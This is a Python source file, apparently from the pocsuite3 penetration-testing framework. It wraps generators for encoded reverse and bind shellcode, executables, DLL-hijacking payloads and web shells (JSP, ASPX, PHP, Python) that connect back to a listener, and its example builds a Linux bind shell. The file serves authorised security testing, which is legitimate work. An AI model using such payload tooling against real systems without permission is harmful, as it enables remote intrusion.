import os
from platform import system, architecture

from pocsuite3.lib.core.data import logger
from pocsuite3.lib.core.enums import SHELLCODE_TYPE, OS, OS_ARCH
from pocsuite3.shellcodes.generator import ShellGenerator
from pocsuite3.shellcodes.encoder import CodeEncoders
from pocsuite3.shellcodes.java import JavaShellCode
from pocsuite3.shellcodes.php import PhpShellCode
from pocsuite3.shellcodes.python import PythonShellCode
from pocsuite3.shellcodes.dotnet import AspxShellCode


class OSShellcodes:
    """
        Class with shellcodes for operating systems (Linux, Windows, etc)
    """

    def __init__(self, os_target, os_target_arch, connect_back_ip='localhost', connect_back_port=5555, bad_chars=['\x00']):
        """
        Initializes object OSShellcodes.
        :param os_target: (string) "WINDOWS" or "LINUX"
        :param os_target_arch: (string) "32bit" or "64bit"
        :param connect_back_ip: (string) Ip address of machine with enabled shell listener
        :param connect_back_port: (int) Port where listener listen to connection.
        :param bad_chars: (list of strings) Badchars for encoder
        :return:
        """
        self.name = ""
        self.OS_TARGET = os_target
        self.OS_TARGET_ARCH = os_target_arch
        self.CONNECTBACK_IP = connect_back_ip
        self.CONNECTBACK_PORT = connect_back_port
        self.BADCHARS = bad_chars
        self.OS_SYSTEM = system().upper()
        self.OS_ARCH = (architecture())[0]
        self.binary_path = ""
        return

    def create_shellcode(self, _shellcode_type='reverse', command='calc.exe', message='', encode=None, make_exe=0,
                         debug=0, filename="", dll_inj_funcs=[], shell_args={},
                         use_precompiled=True):
        """
        Function for create shellcode.
        :param _shellcode_type: (string) Can be "reverse" or "bind".
        :param command: (string) Command for Windows command-shellcode.
        :param message: (string) Message for "message" for message-shellcode.
        :param encode: (string) Encoder type. Can be "xor", "alphanum", "rot_13", "fnstenv" or "jumpcall". If empty shellcode will not be encoded.
        :param make_exe: (bool) or (int) If True(or 1) exe file will be generated from shellcode.
        :param debug: (bool) or (int) If True(or 1) shellcode will be printed to stdout.
        :param filename: (string) Used for assign special name to executable or dll shellcode.
        :param dll_inj_funcs: (list of strings) Functions names for dll hijacking. If not empty dll with shellcode will be generated.
        :param cloud_generate (bool) Used for generate shellcode on cloud server.
        :return: (string) Generated shellcode.
        """
        generator = ShellGenerator(self.OS_TARGET, self.OS_TARGET_ARCH)
        shellcode, self.binary_path = generator.get_shellcode(_shellcode_type,
                                                              connectback_ip=self.CONNECTBACK_IP,
                                                              connectback_port=self.CONNECTBACK_PORT,
                                                              make_exe=make_exe,
                                                              debug=debug,
                                                              filename=filename,
                                                              dll_inj_funcs=dll_inj_funcs,
                                                              shell_args=shell_args,
                                                              use_precompiled=use_precompiled)
        if encode:
            if debug:
                logger.debug("[] Encode shellcode is on and started")
            e = CodeEncoders(self.OS_SYSTEM, self.OS_TARGET, self.OS_TARGET_ARCH, self.BADCHARS)
            e_shellcode = e.encode_shellcode(shellcode, encode, debug)

            if debug:
                logger.debug("Length of encoded shellcode: %d" % len(e_shellcode))
                logger.debug("[] Encode shellcode finished")
            if e_shellcode:
                shellcode = e_shellcode
        else:
            if debug:
                logger.debug("[] Encode shellcode is off")
        return shellcode

    def get_exe_path(self):
        if os.path.exists(self.binary_path + ".exe"):
            return os.path.normpath(self.binary_path + ".exe")
        return None

    def get_dll_path(self):
        if os.path.exists(self.binary_path + ".dll"):
            return os.path.normpath(self.binary_path + ".dll")
        return None


class WebShell:
    def __init__(self, connect_back_ip='localhost', connect_back_port=5555):
        """
        Class for generating shells for jsp, aspx, python, php
        :param connect_back_ip: (string) Ip address of machine with enabled shell listener
        :param connect_back_port: (int) Port where listener listen to connection.
        """
        self.CONNECTBACK_IP = connect_back_ip
        self.CONNECTBACK_PORT = connect_back_port

    def create_shellcode(self, shell_type, inline=False):
        """
        Creates shellcode of given type
        :param type: (string) aspx, jar, jsp, python, php
        :param inline: (bool) If True all symbols \r, \n, \t will be removed from shellcode
        :return: (string) Generated shellcode
        """
        if shell_type == SHELLCODE_TYPE.JSP:
            shell = JavaShellCode(self.CONNECTBACK_IP, self.CONNECTBACK_PORT, shell_type=SHELLCODE_TYPE.JSP)
        elif shell_type == SHELLCODE_TYPE.JAR:
            shell = JavaShellCode(self.CONNECTBACK_IP, self.CONNECTBACK_PORT, shell_type=SHELLCODE_TYPE.JAR, make_jar=1)
        elif shell_type == SHELLCODE_TYPE.ASPX:
            shell = AspxShellCode(self.CONNECTBACK_IP, self.CONNECTBACK_PORT)
        elif shell_type == SHELLCODE_TYPE.PYTHON:
            shell = PythonShellCode(self.CONNECTBACK_IP, self.CONNECTBACK_PORT)
        elif shell_type == SHELLCODE_TYPE.PHP:
            shell = PhpShellCode(self.CONNECTBACK_IP, self.CONNECTBACK_PORT)
        else:
            print("There is no shellcode of type: {}".format(type))
            return ""
        shellcode = shell.get_shellcode(inline)
        return shellcode, shell


if __name__ == "__main__":
    # Example of generating shellcode for Linux/Windows
    print("[] Generate shellcode started")

    BADCHARS = ["\x00", "\x0a", "\x0d", "\x3b"]

    os_target = OS.LINUX
    os_target_arch = OS_ARCH.X86
    s = OSShellcodes(os_target, os_target_arch, '192.168.1.9', 4443, BADCHARS)
    dll_funcs = ["pcap_findalldevs", "pcap_close", "pcap_compile", "pcap_datalink", "pcap_datalink_val_to_description",
                 "pcap_dump", "pcap_dump_close", "pcap_dump_open", "pcap_file", "pcap_freecode", "pcap_geterr",
                 "pcap_getevent", "pcap_lib_version", "pcap_lookupdev", "pcap_lookupnet", "pcap_loop", "pcap_open_live",
                 "pcap_open_offline", "pcap_setfilter", "pcap_snapshot", "pcap_stats"]

    shellcode_type = 'bind'
    shellcode = s.create_shellcode(
        shellcode_type,
        encode='',
        make_exe=1,
        debug=1,
        # dll_inj_funcs=dll_funcs,
        filename=shellcode_type,
        # use_precompiled=False
    )
    # print(shellcode)
    print("[] Generate shellcode finished")